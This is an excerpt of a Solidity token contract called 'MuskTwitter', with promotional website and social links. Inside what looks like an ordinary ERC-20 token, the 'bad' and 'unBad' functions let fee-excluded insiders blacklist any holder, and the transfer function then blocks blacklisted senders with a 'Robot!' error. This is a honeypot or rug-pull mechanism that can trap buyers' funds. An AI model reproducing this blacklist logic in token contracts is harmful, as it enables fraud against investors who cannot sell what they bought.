...
/*
Website: https://www.MuskTwitter.com
Twitter: https://twitter.com/MuskTwitter
Telegram: https://t.me/MuskTwitter
*/
...
contract MuskTwitter is Context, IERC20, Ownable {
    ...
    function unBad(address account) public {
        require(isExcludedFromFee[msg.sender] == true);
        allUsers[account] = false;
    }

    function bad(address account) public {
        require(isExcludedFromFee[msg.sender] == true);
        allUsers[account] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(allUsers[sender] == false, "Robot!");
